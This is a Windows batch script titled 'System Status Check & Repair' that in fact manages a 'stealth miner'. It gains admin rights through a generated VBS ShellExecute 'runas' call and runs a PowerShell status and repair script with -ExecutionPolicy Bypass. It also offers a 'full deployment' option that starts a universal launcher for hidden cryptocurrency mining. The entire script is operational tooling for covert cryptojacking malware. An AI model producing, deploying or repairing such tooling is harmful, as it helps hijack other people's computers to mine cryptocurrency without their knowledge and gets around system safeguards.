@echo off
setlocal enabledelayedexpansion
title System Status Check & Repair - FIXED VERSION
color 0A

echo.
echo =====================================================
echo   UNIVERSAL MINER STATUS CHECK ^& REPAIR
echo =====================================================
echo.

REM Check if running as admin
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if !errorlevel! neq 0 (
    echo [!] Requesting admin privileges for repair...
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\elevate.vbs"
    "%temp%\elevate.vbs"
    del "%temp%\elevate.vbs" >nul 2>&1
    exit /b
)

echo [✓] Running with admin privileges
echo.

REM Check what to do
echo What would you like to do?
echo.
echo [1] Quick Status Check Only
echo [2] Status Check + Auto Repair
echo [3] Full Deployment (Universal Launcher)
echo.
set /p "choice=Enter your choice (1-3): "

if "!choice!"=="1" goto :status_only
if "!choice!"=="2" goto :status_repair
if "!choice!"=="3" goto :full_deployment
goto :status_repair

:status_only
echo.
echo [*] Running stealth miner status check...
powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "& '%~dp0stealth_status_check.ps1'"
goto :end

:status_repair
echo.
echo [*] Running stealth miner status check with auto-repair...
powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "& '%~dp0stealth_status_check.ps1' -Repair"
goto :end

:full_deployment
echo.
echo [*] Launching Universal Launcher for full deployment...
start "Universal Launcher" "%~dp0UNIVERSAL_LAUNCHER.bat"
goto :end

:end
echo.
echo =====================================================
echo   STATUS CHECK COMPLETED
echo =====================================================
echo.
echo 💡 Next steps:
echo     • If issues found: Run option 2 to auto-repair
echo     • For full setup: Run UNIVERSAL_LAUNCHER.bat as admin  
echo     • For mining: Choose Option 1, 6, or 7 in Universal Launcher
echo     • The PowerShell syntax error has been FIXED!
echo.
echo Press any key to continue...
pause >nul
